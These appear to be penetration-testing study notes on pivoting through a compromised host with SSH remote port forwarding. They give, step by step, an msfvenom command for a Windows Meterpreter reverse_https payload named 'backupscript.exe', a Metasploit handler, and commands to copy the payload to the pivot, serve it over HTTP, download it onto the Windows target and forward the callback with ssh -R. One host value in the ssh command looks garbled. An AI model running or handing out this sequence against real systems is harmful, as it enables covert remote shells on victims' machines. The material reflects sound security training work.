# Remote Port Forwarding
- forward a local service to the remote port
    
    - needed because the remote host doesn’t have a route to the attacker machine
    
![[../assets/Remote-Reverse Port Forwarding with SSH/image 194.png|image 194.png]]
- in order to establish a full back and forth connection, we need to use our same pivot host to route the remote machine’s traffic back to ours
  
- to create a meterpreter shell, we need to create a meterpreter HTTPS payload using msfvenom
    
    - configuration of the reverse connection for the payload would be the pivot host
    
    - for their example, they used port 8080 on the pivot host to forward all reverse packets to our port 8000, where the metasploit listener was running
    
  
## Creating a Windows Payload with Msfvenom
```JavaScript
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <pivot_host_IP> -f exe -o backupscript.exe LPORT=<pivot_port>
```
- note that pivot_IP is going to be the IP connected to the internal network
- pivot port is the port on the pivot host that will forward traffic back to us
  
## Configuring & Starting the multi/handler
```JavaScript
use exploit/multi/handler
set lhost 0.0.0.0
set lport <lport>
run
```
- once the payload is created, we can copy the payload to the pivot host
  
## Transferring Payload to Pivot Host
```JavaScript
scp backupscript.exe <user>@<IP>:~/
```
- once the pivot host has the payload, create a python3 HTTP server so the Windows target can grab it
  
## Starting Python3 Webserver on Pivot Host
```JavaScript
python3 -m http.server 8123
```
  
## Downloading Payload on Windows Target
```JavaScript
Invoke-WebRequest -Uri "http://<pivot_ip>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```
  
  
## Set up Remote Port Forwarding with ssh -R
```JavaScript
ssh -R <pivot_IP>:8080:0000:<attacker_port> <user>@<IP> -vN
```
- THIS COMMAND IS RUN ON THE PIVOT HOST (hence why the IP used is 0.0.0.0)
- note that pivot_IP is going to be the IP connected to the internal network (on another NIC)
- attacker_port is the port that msfconsole is listening on
- -vN means verbose and does not prompt login shell
  
  
![[../assets/Remote-Reverse Port Forwarding with SSH/image 1 143.png|image 1 143.png]]